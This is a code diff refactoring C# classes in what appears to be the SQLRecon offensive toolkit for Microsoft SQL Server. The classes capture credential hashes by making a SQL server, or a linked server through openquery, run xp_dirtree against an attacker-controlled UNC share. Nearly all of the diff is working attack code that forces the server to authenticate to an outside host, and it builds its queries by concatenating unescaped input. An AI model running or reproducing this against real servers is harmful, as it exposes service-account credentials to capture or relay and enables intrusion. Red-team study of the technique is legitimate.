@@ -1,36 +1,24 @@
-using System;
+﻿using System;
 using System.Data.SqlClient;
 
 namespace SQLRecon.Modules
 {
-    public class CaptureHash
+    public class SMB
     {
-        public CaptureHash(SqlConnection con, String share)
-        {
-            initialize(con, share);
-        }
+        SQLQuery sqlQuery = new SQLQuery();
 
         // this takes a file share (\\ip\share) and requests the share directly from the sql server
-        public void initialize(SqlConnection con, String share)
+        public void CaptureHash(SqlConnection con, String share)
         {
-            SqlCommand command = new SqlCommand("EXEC master..xp_dirtree \"" + share + "\";", con);
-            SqlDataReader reader = command.ExecuteReader();
-            reader.Close();
-        } //end initialize
-    }
-
-    public class CaptureLinkedHash
-    {
-        public CaptureLinkedHash(SqlConnection con, String linkedSQLServer, String share)
-        {
-            initialize(con, linkedSQLServer, share);
+            string sqlOutput = "";
+            sqlOutput = sqlQuery.ExecuteCustomQuery(con,"EXEC master..xp_dirtree \"" + share + "\";");
         }
-        // this simply takes a SQL query, executes it on a linked server and prints to console
-        public void initialize(SqlConnection con, String linkedSQLServer, String share)
+
+        // this takes a file share (\\ip\share) and requests the share from the linked ssql server
+        public void CaptureLinkedHash(SqlConnection con, String linkedSQLServer, String share)
         {
-            SqlCommand command = new SqlCommand("select * from openquery(\"" + linkedSQLServer + "\", 'SELECT 1; EXEC master..xp_dirtree \"" + share + "\";')", con);
-            SqlDataReader reader = command.ExecuteReader();
-            reader.Close();
+            string sqlOutput = "";
+            sqlOutput = sqlQuery.ExecuteCustomQuery(con, "select * from openquery(\"" + linkedSQLServer + "\", 'SELECT 1; EXEC master..xp_dirtree \"" + share + "\";')");
         }
     }
 }
